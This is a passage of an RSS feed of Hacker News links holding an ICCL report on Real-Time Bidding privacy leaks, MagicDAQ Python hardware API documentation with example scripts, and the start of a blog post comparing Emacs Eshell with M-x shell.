      <p><a href="https://nipunbatra.github.io/os2020/Zines/Valgrind.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1HpXGbFqlU-w7o6WIjGNB1MT0W6jC1WY5/view?usp=sharing">[Video]</a>
    </p></div>
  </div>
<div>
    <p><img src="https://nipunbatra.github.io/os2020/Zines/VIM.png" alt="">
    </p>
    <div>
      <h3><b>VIM</b></h3>
      <p>Shril mody &amp;  hetvi shastri</p>
 
      <p><a href="https://nipunbatra.github.io/os2020/Zines/VIM.pdf">[Poster]</a>     <a href="https://drive.google.com/file/d/1sot_LDAZBRTTdtZHbKBNJxWmJQ8B0RlQ/view?usp=sharing">[Video]</a>
    </p></div>
  </div>

  </article></div>]]>
            </description>
            <link>https://nipunbatra.github.io/os2020/zine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547746</guid>
            <pubDate>Mon, 21 Sep 2020 19:57:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New data on the consequences of the biggest data breach of all time]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547540">thread link</a>) | @freediver
<br/>
September 21, 2020 | https://www.iccl.ie/human-rights/info-privacy/rtb-data-breach-2-years-on/ | <a href="https://web.archive.org/web/*/https://www.iccl.ie/human-rights/info-privacy/rtb-data-breach-2-years-on/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><main id="main-content-container"><article aria-label="New data on the RTB privacy crisis: people with AIDS profiled in Ireland, and Polish elections influenced."><div>
<p><br><strong><em>This note presents new evidence of the scale of the vast RTB data breach, and of the consequences of two years of failure to enforce.&nbsp;</em></strong></p>



<p>September 2020 is the two year anniversary of my formal complaint to the Irish Data Protection Commission about the Real-Time Bidding privacy crisis. In these two years, RTB has been allowed to continue to infringe Article 5(1)f of the GDPR, which requires security of personal data. In fact, this vast data breach appears&nbsp;to have worsened.&nbsp;</p>



<p>Today, we at the ICCL submitted&nbsp;evidence to the DPC that show the consequence of failure to enforce the GDPR to stop the vast RTB data breach at the heart of the online advertising industry.</p>



<p><a href="https://www.dropbox.com/sh/7xo77grl2mnb6b6/AAAlszXoQ_zM2kUSsSRqKJSqa?dl=0" target="_blank" rel="noreferrer noopener">This evidence includes a proven case of electoral influence, profiling of people with AIDS and cancer, and a list of 968 companies that&nbsp;Google sends information to about the private things that we do and&nbsp;watch online</a>.&nbsp;</p>



<div><figure><img loading="lazy" width="720" height="405" src="https://www.iccl.ie/wp-content/uploads/2020/09/RTB-broadcast-from-website-DPC-2020.gif" alt=""></figure></div>















<h2>Key insights in the submission&nbsp;&nbsp;</h2>



<ul><li>Real-Time Bidding operates behind the scenes on websites and apps. It constantly broadcasts the private things we do and watch online, and where we are in the real-world, to countless companies. As a result, we are all an open book to data broker companies, and others, who can build intimate dossiers about each of us. <strong>Google’s RTB system sends this data to 968 companies (see <a href="https://www.iccl.ie/wp-content/uploads/2020/09/6.-The-964-companies-that-Google-sends-our-data-to-Appendix-F.pdf" target="_blank" rel="noreferrer noopener">Appendix F for a 25&nbsp;page list of these companies</a>).&nbsp;</strong></li></ul>



<figure><p>
<iframe title="The companies that Google's RTB system sends data to in Europe" src="https://player.vimeo.com/video/459871060?dnt=1&amp;app_id=122963" width="500" height="261" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
</p></figure>



<ul><li>A data broker company that uses RTB data to profile people <strong>influenced the 2019 Polish Parliamentary Election </strong>by<strong> targeting LGBTQ+ people</strong>. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=5" target="_blank" rel="noreferrer noopener">See page 5</a>.&nbsp;<br>&nbsp;</li><li>Google’s RTB system allows users to target 1,200 people in Ireland profiled in a “<strong>Substance abuse</strong>” category, based on a data broker profile built with RTB data. Other health condition profiles from the same data broker available via Google included “<strong>Diabetes</strong>”,&nbsp; “<strong>Chronic Pain</strong>”, and “<strong>Sleep Disorders</strong>”. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=6" target="_blank" rel="noreferrer noopener">See page 6</a>.&nbsp;<br>&nbsp;</li><li>The IAB’s RTB system allows users to target 1,300 people in Ireland profiled in a “<strong>AIDS &amp; HIV</strong>” category, based on a data broker profile build with RTB data. Other categories from the same data broker include “<strong>Incest &amp; Abuse Support</strong>”, “<strong>Brain Tumor</strong>”, “<strong>Incontinence</strong>”, and “<strong>Depression</strong>”.&nbsp;<a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=6" target="_blank" rel="noreferrer noopener">See page 6</a>.&nbsp;<br>&nbsp;</li><li>A data broker that gathers RTB data tracked <strong>the movements of people in Italy</strong> to see if they observed the <strong>Covid-19 lockdown</strong>. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=11" target="_blank" rel="noreferrer noopener">See page 11-12</a>.&nbsp;<br></li><li>A data broker that illicitly <strong>profiled Black Lives Matters protesters</strong> in the United States has also been allowed to gather <strong>RTB data about Europeans</strong>. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=9" target="_blank" rel="noreferrer noopener">See page 9</a>.&nbsp;<br>&nbsp;</li><li>The industry template for profiles includes intimate personal characteristics such as “<strong>Infertility</strong>”, “<strong>STD</strong>”, and “<strong>Conservative</strong>” politics. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=13" target="_blank" rel="noreferrer noopener">See pages 13-15</a>.&nbsp;<br>&nbsp;</li><li>RTB is the most massive data breach yet recorded, involving millions of websites and apps, and hundreds of billions of individual data leaks per day. Google’s RTB system now <strong>sends people’s private data to more companies</strong>, and <strong>from more websites than when the DPC was notified two years ago</strong>. A single ad exchange using the IAB RTB system now sends 120 billion RTB broadcasts in a day, an <strong>increase of 140% over two years ago when the DPC was notified</strong>. <a href="https://www.iccl.ie/wp-content/uploads/2020/09/1.-Submission-to-Data-Protection-Commissioner.pdf#page=16" target="_blank" rel="noreferrer noopener">See pages 16-18</a>.</li></ul>















<figure><img loading="lazy" width="1024" height="576" src="https://www.iccl.ie/wp-content/uploads/2020/09/onaudience-1024x576.png" alt="" srcset="https://www.iccl.ie/wp-content/uploads/2020/09/onaudience-1024x576.png 1024w, https://www.iccl.ie/wp-content/uploads/2020/09/onaudience-300x169.png 300w, https://www.iccl.ie/wp-content/uploads/2020/09/onaudience-768x432.png 768w, https://www.iccl.ie/wp-content/uploads/2020/09/onaudience-1536x864.png 1536w, https://www.iccl.ie/wp-content/uploads/2020/09/onaudience.png 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><em>Image: a sample from data broker “OnAudience”, showing that 2,300 people in Ireland have been classified as suffering chronic pain, and can be purchased via Google’s RTB system, or through the IAB’s RTB system using The Trade Desk or Ad Form. Another sample shows that 200 people in Ireland have been classified as being interested in “Incest &amp; Abuse Support”.&nbsp;</em></figcaption></figure>



<h3>Video: the RTB privacy crisis </h3>



<figure><p>
<iframe title="The biggest data breach in history: Real-Time Bidding" src="https://player.vimeo.com/video/451973748?dnt=1&amp;app_id=122963" width="500" height="281" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>
</p><figcaption><a href="https://vimeo.com/451973748" target="_blank" rel="noreferrer noopener">Video: Overview of the RTB Privacy Crisis</a></figcaption></figure>




</div></article></main></div></div></div></div>]]>
            </description>
            <link>https://www.iccl.ie/human-rights/info-privacy/rtb-data-breach-2-years-on/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547540</guid>
            <pubDate>Mon, 21 Sep 2020 19:38:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Python for the Real World – A Super Simple Python USB DAQ]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547485">thread link</a>) | @IOTEE
<br/>
September 21, 2020 | https://magicdaq.github.io/magicdaq_docs/ | <a href="https://web.archive.org/web/*/https://magicdaq.github.io/magicdaq_docs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">  
  

<section id="content">

  <article>
    <a name="/Install_MagicDAQ" href="#/Install_MagicDAQ"><h2><code><b>System</b> </code> Install MagicDAQ</h2></a>
    <section>
      <h3 id="magicdaq-hardware">MagicDAQ Hardware</h3>
<p>To use this API, you will need the MagicDAQ hardware, which you can find at <a href="https://www.magicdaq.com/">magicdaq.com</a></p>

<h3 id="python-3-on-windows">Python 3 on Windows</h3>
<p>MagicDAQ must be run with Python 3 on Windows. MagicDAQ is downloaded using pip.</p>

<ul>
  <li>You can download the latest version of Python <a href="https://www.python.org/downloads/">here</a></li>
  <li>Don’t forget to <a href="https://datatofish.com/add-python-to-windows-path/">add Python to the Windows PATH</a></li>
</ul>

<p>You can test if your system is ready to go by <a href="https://www.lifewire.com/how-to-open-command-prompt-2618089">opening a command prompt</a> and entering:</p>

<p><code>python -m pip</code></p>

<p>You are ready to download MagicDAQ if you get back something like the following:</p>
<div><div><pre><code>Usage:
  C:\Users\srh\AppData\Local\Programs\Python\Python36\py3.exe -m pip &lt;command&gt; [options]

Commands:
</code></pre></div></div>
<p>If you see something different, <a href="https://projects.raspberrypi.org/en/projects/using-pip-on-windows">please check that pip is installed and working.</a></p>

<p>If you need a bit of help getting started with MagicDAQ, feel free to email us at:</p>

<blockquote>
  <p>support@magicdaq.com</p>
</blockquote>

<h3 id="install-magicdaq-with-pip">Install MagicDAQ with Pip</h3>

<p>Open a command prompt and enter:</p>

<p><code>python -m pip install magicdaq</code></p>

<ul>
  <li>To upgrade an existing magicdaq instillation to the latest version, add <code>--upgrade</code> to the end of the above command</li>
  <li>To see install debug output, add <code>-v</code> to the end of above command</li>
</ul>



<p>If this is your first time installing MagicDAQ, you will need to allow MagiDAQ to install it’s driver on your computer.</p>
<ul>
  <li>During the instillation process, two pop ups will appear - please approve them.</li>
</ul>

<p><img src="https://magicdaq.github.io/magicdaq_docs/images/driver_installer_auth.png" alt="Alt Text"></p>

<p><img src="https://magicdaq.github.io/magicdaq_docs/images/driver_auth.png" alt="Alt Text"></p>

<p><a href="https://pypi.org/project/magicdaq/">MagicDAQ is hosted on PyPi</a></p>


    </section>
  </article>

  <article>
    <a name="/CheckMagicDAQInstall" href="#/CheckMagicDAQInstall"><h2><code><b>System</b> CODE EXAMPLE</code> Check MagicDAQ Install</h2></a>
    <section>
      <p>You can check that MagicDAQ is installed properly by running the following code.</p>
<ul>
  <li>It is not necessary to have MagicDAQ connected to the computer in order to run this code</li>
</ul>

<h3 id="example-code">Example Code</h3>

<p><a href="https://github.com/MagicDAQ/magicdaq_docs/tree/master/example_python_files">Source File</a></p>

<div><div><pre><code>
<span># This script checks that the MagicDAQ API and MagicDAQ Driver were installed properly
# It is NOT NECESSARY to have the MagiDAQ connected to the computer
</span>
<span>print</span><span>(</span><span>'*** MagicDAQ Install Check***'</span><span>)</span>
<span>print</span><span>(</span><span>''</span><span>)</span>

<span>try</span><span>:</span>

    <span># Import MagicDAQDevice object
</span>    <span>from</span> <span>magicdaq.api_class</span> <span>import</span> <span>MagicDAQDevice</span>

    <span># Create daq_one object
</span>    <span>daq_one</span> <span>=</span> <span>MagicDAQDevice</span><span>()</span>
    <span>print</span><span>(</span><span>'GOOD: MagicDAQ API is installed properly.'</span><span>)</span>

    <span># Get MagicDAQ Driver Version
</span>    <span>driver_version</span> <span>=</span> <span>daq_one</span><span>.</span><span>get_driver_version</span><span>()</span>

    <span>if</span> <span>driver_version</span> <span>==</span> <span>1.0</span><span>:</span>
        <span>print</span><span>(</span><span>'GOOD: MagicDAQ Driver is installed properly.'</span><span>)</span>
        <span>print</span><span>(</span><span>'You are ready to use MagicDAQ!'</span><span>)</span>
    <span>else</span><span>:</span>
        <span>print</span><span>(</span><span>'ERROR: MagicDAQ Driver version not expected value: '</span><span>+</span><span>str</span><span>(</span><span>driver_version</span><span>))</span>
        <span>print</span><span>(</span><span>'Try installing MagicDAQ using pip again.'</span><span>)</span>
        <span>print</span><span>(</span><span>'https://magicdaq.github.io/magicdaq_docs/#/Install_MagicDAQ'</span><span>)</span>
        <span>print</span><span>(</span><span>'Feel free to email MagicDAQ Support at: support@magicdaq.com'</span><span>)</span>

<span>except</span> <span>Exception</span> <span>as</span> <span>exception_text</span><span>:</span>
    <span>print</span><span>(</span><span>'Original exception: '</span><span>)</span>
    <span>print</span><span>(</span><span>exception_text</span><span>)</span>
    <span>print</span><span>(</span><span>''</span><span>)</span>
    <span>print</span><span>(</span><span>'ERROR: Unable to import MagicDAQ API.'</span><span>)</span>
    <span>print</span><span>(</span><span>'Mostly likely, MagicDAQ has not been properly downloaded and installed using pip.'</span><span>)</span>
    <span>print</span><span>(</span><span>'Please consult MagicDAQ API Docs: https://magicdaq.github.io/magicdaq_docs/#/Install_MagicDAQ'</span><span>)</span>
    <span>print</span><span>(</span><span>'Feel free to email MagicDAQ Support at: support@magicdaq.com'</span><span>)</span>

<span>print</span><span>(</span><span>''</span><span>)</span>
<span>print</span><span>(</span><span>'*** MagicDAQ Install Check Completed***'</span><span>)</span>

</code></pre></div></div>

<h3 id="expected-output">Expected Output</h3>

<div><div><pre><code>
GOOD: MagicDAQ API is installed properly.
GOOD: MagicDAQ Driver is installed properly.
You are ready to use MagicDAQ!

</code></pre></div></div>

<h3 id="magicdaq-hardware-check">MagicDAQ Hardware Check</h3>

<p>Connect the MagicDAQ to the computer using the USB cable.</p>
<ul>
  <li>If the driver is installed properly, you will see the red LED power light on the top of the DAQ pulsing.</li>
  <li>If the driver is not installed, the red LED power light will be constantly on.</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/MagicDAQ_Basics" href="#/MagicDAQ_Basics"><h2><code><b>System</b> CODE EXAMPLE</code> MagicDAQ Hello World Example</h2></a>
    <section>
      <h3 id="import-magicdaqdevice-object">Import MagicDAQDevice Object</h3>
<p>Every Python script must import the MagicDAQDevice object.</p>

<div><div><pre><code><span>from</span> <span>magicdaq.api_class</span> <span>import</span> <span>MagicDAQDevice</span>
</code></pre></div></div>

<p>All features of the MagicDAQDevice are accessed by creating a MagicDAQDevice object and calling methods on this object.</p>
<ul>
  <li>Create <code>MagicDAQDevice</code> object</li>
  <li>Open the DAQ with <code>open_daq_device()</code></li>
  <li>Do usefull things with the DAQ by calling methods on the object</li>
  <li>Close the DAQ with <code>close_daq_device()</code></li>
</ul>

<h3 id="hello-world-example-code">Hello World Example Code</h3>

<p><a href="https://github.com/MagicDAQ/magicdaq_docs/tree/master/example_python_files">Source File</a></p>

<div><div><pre><code>
<span># Use the USB cable to plug MagicDAQ into your computer
</span>
<span># Import MagicDAQDevice object
</span><span>from</span> <span>magicdaq.api_class</span> <span>import</span> <span>MagicDAQDevice</span>

<span># Create daq_one object
</span><span>daq_one</span> <span>=</span> <span>MagicDAQDevice</span><span>()</span>

<span># Connect to the MagicDAQ
</span><span>daq_one</span><span>.</span><span>open_daq_device</span><span>()</span>

<span># Do use full things with the DAQ
# For example, you can read a digital pin's state
</span><span>print</span> <span>(</span><span>'This is Digital Pin P0.0 State: '</span><span>+</span><span>str</span><span>(</span><span>daq_one</span><span>.</span><span>read_digital_input</span><span>(</span><span>0</span><span>)))</span>

<span># We are done using the MagicDAQ, so close it
</span><span>daq_one</span><span>.</span><span>close_daq_device</span><span>()</span>

</code></pre></div></div>

<h3 id="expected-output">Expected Output</h3>

<div><div><pre><code>This is Digital Pin P0.0 State: 1
</code></pre></div></div>

    </section>
  </article>

  <article>
    <a name="/open_daq_device" href="#/open_daq_device"><h2><code><b>System</b> </code> open_daq_device()</h2></a>
    <section>
      <p>Method opens a daq device for utilization.</p>

<h3 id="definition">Definition</h3>

<div><div><pre><code><span>open_daq_device</span><span>(</span><span>daq_serial_num</span> <span>=</span> <span>None</span><span>)</span>
</code></pre></div></div>

<h3 id="optional-arguments">Optional Arguments</h3>

<ul>
  <li><code>daq_serial_num: str</code> DAQ Serial Number. When supplied, open_daq_device connects to the specified device.</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/close_daq_device" href="#/close_daq_device"><h2><code><b>System</b> </code> close_daq_device()</h2></a>
    <section>
      <p>Method closes the DAQDevice. Call this method after you are finished using the DAQ device.</p>
<ul>
  <li>In order to use the DAQ hardware again, you will have to call the <code>open_daq_device()</code> method.</li>
</ul>

<h3 id="definition">Definition</h3>



    </section>
  </article>

  <article>
    <a name="/read_digital_input" href="#/read_digital_input"><h2><code><b>Digital-IO</b> P0.0 - P0.7</code> read_digital_input()</h2></a>
    <section>
      <p>Method reads a digital input pin and returns either 1 (meaning High) or 0 (meaning Low).</p>
<ul>
  <li>The digital input pin has an internal pull-up resistor. As such, the pin defaults to High.</li>
  <li>If the digital pin has previously been driven Low by a <code>set_digital_output()</code> command, ensure that you run
          the <code>read_digital_input()</code> command before applying external voltage. This prevents excessive current being
          shunted to GND, possibly damaging the DAQ.</li>
</ul>

<h3 id="definition">Definition</h3>

<div><div><pre><code><span>read_digital_input</span><span>(</span><span>channel</span><span>:</span> <span>int</span><span>)</span>
</code></pre></div></div>

<h3 id="required-arguments">Required Arguments</h3>

<ul>
  <li><code>channel: int</code> DAQ pin number. For example, channel ‘P0.0’ is pin number <code>0</code>. Must be an integer <code>0</code> - <code>7</code>.</li>
</ul>

<h3 id="returns">Returns</h3>

<ul>
  <li><code>pin_status : int</code> : <code>1</code> = High, <code>0</code> = Low</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/set_digital_output" href="#/set_digital_output"><h2><code><b>Digital-IO</b> P0.0 - P0.7</code> set_digital_output()</h2></a>
    <section>
      <p>Method makes a digital output pin either High or Low.</p>

<h3 id="definition">Definition</h3>

<div><div><pre><code><span>set_digital_output</span><span>(</span><span>channel</span><span>:</span> <span>int</span><span>,</span> <span>pin_state</span><span>:</span> <span>int</span><span>)</span>
</code></pre></div></div>

<h3 id="required-arguments">Required Arguments</h3>

<ul>
  <li><code>channel: int</code> DAQ pin number. For example, channel ‘P0.0’ is pin number <code>0</code>. Must be an integer <code>0</code> - <code>7</code>.</li>
  <li><code>pin_state: int </code>: State of digital output pin. <code>1</code> = High (5V) and <code>0</code> = Low (0V)</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/digital_io_example" href="#/digital_io_example"><h2><code><b>Digital-IO</b> CODE EXAMPLE</code> Digital IO Example</h2></a>
    <section>
      <h3 id="example-code">Example Code</h3>

<p><a href="https://github.com/MagicDAQ/magicdaq_docs/tree/master/example_python_files">Source File</a></p>

<div><div><pre><code>
<span># Use the USB cable to plug MagicDAQ into your computer
</span>
<span># Import MagicDAQDevice object
</span><span>from</span> <span>magicdaq.api_class</span> <span>import</span> <span>MagicDAQDevice</span>

<span># Create daq_one object
</span><span>daq_one</span> <span>=</span> <span>MagicDAQDevice</span><span>()</span>

<span># Connect to the MagicDAQ
</span><span>daq_one</span><span>.</span><span>open_daq_device</span><span>()</span>

<span># Read Pin P0.0 State
# If no external voltage is applied to the DAQ, the internal pull up resistor will ensure this pin is HIGH
</span><span>print</span> <span>(</span><span>'This is Digital Pin P0.0 State: '</span><span>+</span><span>str</span><span>(</span><span>daq_one</span><span>.</span><span>read_digital_input</span><span>(</span><span>0</span><span>)))</span>

<span>print</span> <span>(</span><span>'Now setting P0.1 to LOW.'</span><span>)</span>
<span># Set Pin P0.1 to LOW
</span><span>daq_one</span><span>.</span><span>set_digital_output</span><span>(</span><span>1</span><span>,</span><span>0</span><span>)</span>

<span># We are done using the MagicDAQ, so close it
</span><span>daq_one</span><span>.</span><span>close_daq_device</span><span>()</span>

</code></pre></div></div>

<h3 id="expected-output">Expected Output</h3>

<div><div><pre><code>This is Digital Pin P0.0 State: 1
Now setting P0.1 to LOW.
</code></pre></div></div>

    </section>
  </article>

  <article>
    <a name="/read_analog_input" href="#/read_analog_input"><h2><code><b>Analog-Input</b> AI0 - AI7</code> read_analog_input()</h2></a>
    <section>
      <p>Method reads an analog input pin and returns the voltage.</p>
<ul>
  <li>A ‘single ended’ measurement is performed, meaning voltage is measured between the analog input pin and ground (AGND).</li>
  <li>The maximum input voltage for the analog input pins is +/- 10V (referenced to AGND)</li>
</ul>

<h3 id="definition">Definition</h3>

<div><div><pre><code><span>read_analog_input</span><span>(</span><span>channel</span><span>:</span> <span>int</span><span>,</span> <span>decimal_places</span> <span>=</span> <span>2</span><span>)</span>
</code></pre></div></div>

<h3 id="required-arguments">Required Arguments</h3>

<ul>
  <li><code>channel: int</code> : DAQ pin number. For example, channel ‘AI0’ is pin number <code>0</code>. Must be an integer <code>0</code> - <code>7</code>.</li>
</ul>

<h3 id="optional-arguments">Optional Arguments</h3>

<ul>
  <li><code>decimal_places : int</code> : Number of decimal places the reading is rounded to. decimal_places = <code>2</code> is default. Maximum suggested is <code>3</code>.</li>
</ul>

<h3 id="returns">Returns</h3>

<ul>
  <li><code>voltage: float</code> : the voltage measured at the analog input pin specified.</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/read_diff_analog_input" href="#/read_diff_analog_input"><h2><code><b>Analog-Input</b> AI0 - AI7</code> read_diff_analog_input()</h2></a>
    <section>
      <p>Method reads the differential voltage between two analog input pins.</p>
<ul>
  <li>A ‘differential’ measurement is performed, meaning voltage is measured between two analog input pins.</li>
  <li>The maximum input voltage for each analog input pins is +/- 10V (referenced to AGND)</li>
</ul>

<h3 id="definition">Definition</h3>

<div><div><pre><code><span>read_diff_analog_input</span><span>(</span><span>channel_p</span><span>:</span> <span>int</span><span>,</span> <span>channel_n</span><span>:</span> <span>int</span><span>,</span> <span>decimal_places</span> <span>=</span> <span>2</span><span>)</span>
</code></pre></div></div>

<h3 id="required-arguments">Required Arguments</h3>

<ul>
  <li><code>channel_p: int</code> : Positive analog input DAQ pin number. For example, channel ‘AI0’ is pin number <code>0</code>. Must be an integer <code>0</code> - <code>7</code>.</li>
  <li><code>channel_n: int</code> : Negative analog input DAQ pin number. For example, channel ‘AI0’ is pin number <code>0</code>. Must be an integer <code>0</code> - <code>7</code>.</li>
</ul>

<h3 id="optional-arguments">Optional Arguments</h3>

<ul>
  <li><code>decimal_places : int</code> : Number of decimal places the reading is rounded to. decimal_places = <code>2</code> is default. Maximum suggested is <code>3</code>.</li>
</ul>

<h3 id="returns">Returns</h3>

<ul>
  <li><code>voltage: float</code> : the voltage difference between the two analog input pins. Voltage = Vpositive input pin - Vnegative input pin.</li>
</ul>

    </section>
  </article>

  <article>
    <a name="/BasicAnalogInputExample" href="#/BasicAnalogInputExample"><h2><code><b>Analog-Input</b> CODE EXAMPLE</code> Basic Analog Input Example</h2></a>
    <section>
      <h3 id="example-code">Example Code</h3>

<p><a href="https://github.com/MagicDAQ/magicdaq_docs/tree/master/example_python_files">Source File</a></p>

<div><div><pre><code>
<span># Use the USB cable to plug MagicDAQ into your computer
</span>
<span># Import MagicDAQDevice object
</span><span>from</span> <span>magicdaq.api_class</span> <span>import</span> <span>MagicDAQDevice</span>

<span># Create daq_one object
</span><span>daq_one</span> <span>=</span> <span>MagicDAQDevice</span><span>()</span>

<span># Connect to the MagicDAQ
</span><span>daq_one</span><span>.</span><span>open_daq_device</span><span>()</span>

<span># Single ended analog input voltage measurement on pin AI0
# This voltage will be approximately 0.5V if nothing is connected to the DAQ (pin is 'floating')
</span><span>pin_0_voltage</span> <span>=</span> <span>daq_one</span><span>.</span><span>read_analog_input</span><span>(</span><span>0</span><span>)</span>
<span>print</span><span>(</span><span>'Single ended analog input voltage measurement on pin AI0: '</span><span>+</span><span>str</span><span>(</span><span>pin_0_voltage</span><span>))</span>

<span># Differential voltage measurement between pin AI1 and AI2
# This voltage should be roughly 0V if nothing is connected to the DAQ (pins are 'floating')
</span><span>pin_1_pin_2_diff_voltage</span> <span>=</span> <span>daq_one</span><span>.</span><span>read_diff_analog_input</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>)</span>
<span>print</span><span>(</span><span>'Differential voltage measurement between pin AI1 and pin AI2: '</span><span>+</span><span>str</span><span>(</span><span>pin_1_pin_2_diff_voltage</span><span>))</span>

<span># We are done using the MagicDAQ, so close it
</span><span>daq_one</span><span>.</span><span>close_daq_device</span><span>()</span>

</code></pre></div></div>

<h3 id="expected-output">Expected Output</h3>

<div><div><pre><code>Single ended analog input voltage measurement on pin AI0: 0.51
Differential voltage measurement between pin AI1 and pin AI2: 0.00
</code></pre></div></div>

    </section>
  </article>

  <article>
    <a name="/set_analog_output" href="#/set_analog_output"><h2><code><b>Analog-Output</b> AO0 - AO1</code> set_analog_output()</h2></a>
    <section>
      <p>Method sets the output …</p></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://magicdaq.github.io/magicdaq_docs/">https://magicdaq.github.io/magicdaq_docs/</a></em></p>]]>
            </description>
            <link>https://magicdaq.github.io/magicdaq_docs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24547485</guid>
            <pubDate>Mon, 21 Sep 2020 19:33:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eshell versus M-X Shell]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24547400">thread link</a>) | @pmoriarty
<br/>
September 21, 2020 | https://ambrevar.xyz/emacs-eshell-versus-shell/index.html | <a href="https://web.archive.org/web/*/https://ambrevar.xyz/emacs-eshell-versus-shell/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<header>

</header><nav id="table-of-contents">
<h2>Table of Contents</h2>

</nav>
<p>
I’ve <a href="https://ambrevar.xyz/emacs-eshell/index.html">used and defended Eshell</a> for years.  Sadly, Eshell has some long
standing issues that I grew tired of in the long run.  So I’ve decided to switch
to <code>M-x shell</code> and see how much of my Eshell workflow I could port.
</p>

<div id="outline-container-org3f85974">
<h2 id="org3f85974">Language and the underlying shell program</h2>
<div id="text-org3f85974">
<p>
The benefit of using Bash is that it’s the <i>de facto</i> standard for sharing shell
commands on the Internet.  As such, <code>M-x shell</code> can run any of those shell
snippets out there without extra modification.
</p>

<p>
Eshell constantly requires modifications to the syntax, for instance turning
<code>$(...)</code> to <code>${...}</code> or the input redirection <code>&lt;</code> to a pipe.
</p>

<p>
You might complain that Bash is a terrible language and Eshell’s Elisp is vastly
superior.  But even at the language level, <code>M-x shell</code> beats Eshell since it
lets the user choose which underlying program to run (with <code>C-u M-x shell</code>).  So
the same mode can run <code>psql</code>, <code>bash</code>, or <a href="https://github.com/willghatch/racket-rash"><code>rash</code></a> if you fancy a Racket-powered
shell.  And Racket is a much more interesting language than Eshell in my
opinion&nbsp;:)
</p>
</div>
</div>

<div id="outline-container-org0600f56">
<h2 id="org0600f56">Virtualenv and <code>guix environment</code></h2>
<div id="text-org0600f56">
<p>
<code>virtualenv</code> and other environment managers don’t work well with Eshell.
Maybe it would be possible to leverage the <code>direnv</code> Emacs package, but I haven’t
looked into it yet.
</p>

<p>
I’ve heard that <code>nix-env</code> has support for Eshell, so I suppose it would be
equally possible to add Eshell support to <code>guix environment</code>.
</p>

<p>
Until then, <code>M-x shell</code> has better support for environment managers than Eshell.
</p>
</div>
</div>

<div id="outline-container-org9a1e927">
<h2 id="org9a1e927">Completion</h2>
<div id="text-org9a1e927">
<p>
Eshell only offers poor completion by default.
<code>M-x shell</code> can do slightly better if the underlying shell is Bash, but the
latter does not always provide great completion.
</p>

<p>
It’s possible to greatly enhance completion with support from the Fish shell.
The <code>fish-completion</code> package supports both <code>M-x shell</code> and Eshell.
</p>

<p>
You can even display the Fish inline documentation with the
<code>helm-fish-completion</code> package.
</p>
</div>
</div>

<div id="outline-container-org85b8c80">
<h2 id="org85b8c80">Performance</h2>
<div id="text-org85b8c80">
<p>
<code>M-x shell</code> is significantly faster than Eshell at processing long outputs.
To the point that performance is rarely an issue (never was for me at least).
In Eshell, it is not uncommon to see Emacs grind to a halt because of too long
an output.
</p>

<p>
<code>M-x shell</code> is still an order of magnitude slower than, say, <code>emacs-vterm</code>.  The
performance issue is significantly reduced when <code>font-lock-mode</code> is off.  There
may be a few other tricks to boost <code>M-x shell</code> performance.
</p>
</div>
</div>

<div id="outline-container-org8b7abaf">
<h2 id="org8b7abaf">Command duration</h2>
<div id="text-org8b7abaf">
<p>
In Eshell, I implemented a special prompt that reports the duration of the previous
command.  This is very useful because I don’t have to think <i>beforehand</i> whether
I should prefix my command with <code>time</code>.  And I typically don’t want to run a
slow command twice just to know how much time it took.
</p>

<p>
This Eshell prompt is available in the <code>eshell-prompt-extras</code> package:
</p>

<div>
<pre>(setq eshell-prompt-function #'epe-theme-multiline-with-status)
</pre>
</div>

<p>
Sadly, there is no equivalent to <code>eshell-post-command-hook</code> for <code>M-x shell</code>
which makes it impossible to implement using the same (sane) logic.
</p>

<p>
So I had to resort to a hack.  I added the following to my <code>.bashrc</code>
</p>

<div>
<pre>PS1='\e[1;37m[\e[1;32m\w\e[1;37m]\e[m \e[0;34m\D{%F %T}\e[m\n\e[1;37m\$\e[m '
</pre>
</div>

<p>
to get a prompt looking like this:
</p>

<div>
<pre>[~/dotfiles] 2020-06-26 16:36:30
$ echo Hi!
</pre>
</div>

<p>
With a bit of Elisp, I was able to write a <a href="https://gitlab.com/ambrevar/dotfiles/-/blob/adce533dc244f3e4fd5c146172eb48981c73b5b2/.emacs.d/lisp/init-shell.el#L68"><code>ambrevar/shell-command-duration</code></a>
command that parses the prompt and reports the time a command took.
It’s far from perfect but it’s a start.
</p>
</div>
</div>

<div id="outline-container-org50c741d">
<h2 id="org50c741d">Helm-system-packages</h2>
<p>
